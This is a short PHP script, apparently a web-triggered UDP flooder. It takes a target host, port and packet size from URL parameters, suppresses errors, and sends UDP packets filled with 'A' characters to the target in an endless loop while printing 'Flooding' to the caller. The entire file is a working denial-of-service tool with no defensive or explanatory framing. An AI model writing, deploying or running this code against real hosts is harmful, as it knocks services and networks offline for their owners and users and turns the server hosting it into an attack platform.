<?php
error_reporting(0);

$host=$_GET['host'];
$port=$_GET['port'];
$buffer=$_GET['buff'];

$s=socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);

$packet="";
for($x=0;$x<$buffer;$x++) {
    $packet.="A";
}

if(!empty($host) && !empty($port) && !empty($buffer)) {
    echo "Flooding $host On Port $port";
    while(true) {
        socket_sendto($s, $packet, strlen($packet), 0, $host, $port);
    }
}
